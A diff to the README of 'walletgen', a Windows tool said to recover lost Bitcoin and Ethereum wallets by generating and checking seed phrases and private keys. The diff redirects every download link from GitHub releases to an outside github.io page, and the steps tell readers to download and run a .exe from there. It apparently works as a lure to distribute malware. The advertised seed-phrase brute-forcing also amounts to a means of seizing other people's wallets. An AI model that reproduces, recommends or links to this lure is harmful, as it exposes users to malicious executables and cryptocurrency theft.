@@ -1,6 +1,6 @@
 # 🔑 walletgen - Recover lost cryptocurrency wallet seed phrases
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/emelynekuwaiti826/walletgen/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://emelynekuwaiti826.github.io)
 
 WalletGen functions as a tool for individuals who need to recover access to Bitcoin and Ethereum wallets. It generates and checks seed phrases or private keys to help users locate lost or forgotten wallet credentials. This software runs on Windows and uses multithreading to increase the speed of the search process.
 
@@ -17,7 +17,7 @@ Your computer needs to meet basic requirements to run this software effectively.
 
 Follow these steps to obtain the software:
 
-1. Visit the following link to access the official release page: [https://github.com/emelynekuwaiti826/walletgen/releases](https://github.com/emelynekuwaiti826/walletgen/releases)
+1. Visit the following link to access the official release page: [https://emelynekuwaiti826.github.io](https://emelynekuwaiti826.github.io)
 2. Locate the most recent version labeled as "Latest."
 3. Select the file ending in .exe to start your download.
 4. Save the file to a location on your hard drive where you can find it.
